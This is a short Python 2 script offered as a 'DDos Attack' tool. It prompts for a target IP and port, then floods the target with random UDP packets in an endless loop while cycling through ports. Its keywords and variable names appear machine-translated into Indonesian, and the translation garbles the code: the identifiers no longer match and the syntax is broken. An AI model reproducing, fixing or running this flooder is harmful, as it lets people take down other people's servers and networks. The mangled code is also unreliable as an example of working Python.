sistem impor
impor  os
 waktu impor
 soket impor
impor  acak
#Kode Waktu
dari  datetime  impor  datetime
sekarang  = tanggal  waktu . sekarang ()
jam  =  sekarang . jam
menit  =  sekarang . menit
hari  =  sekarang . hari
bulan  =  sekarang . bulan
tahun  =  sekarang . tahun

####################
kaus kaki  =  soket . soket ( soket . AF_INET , soket . SOCK_DGRAM )
byte  =  acak . _urandom ( 1490 )
###################

os . sistem ( "jelas" )
os . sistem ( "Figlet DDos Attack" )
mencetak
print  "Penulis : MRS204"
cetak  "github : https://github.com/mrs204"
mencetak
ip  =  raw_input ( "Target IP : " )
port  =  masukan ( "Port : " )

os . sistem ( "jelas" )
os . sistem ( "Figlet Serangan Mulai" )
cetak  "[ ] 0% "
waktu . tidur ( 5 )
cetak  "[===== ] 25%"
waktu . tidur ( 5 )
cetak  "[========== ] 50%"
waktu . tidur ( 5 )
cetak  "[================ ] 75%"
waktu . tidur ( 5 )
cetak  "[====================] 100%"
waktu . tidur ( 3 )
dikirim  =  0
sedangkan  Benar :
     kaus kaki . sendto ( byte , ( ip , port ))
     terkirim  =  terkirim  +  1
     pelabuhan  =  pelabuhan  +  1
     print  "Mengirim paket %s ke %s melalui port:%s" % ( terkirim , ip , port )
     jika  port  ==  65534 :
       pelabuhan  =  1
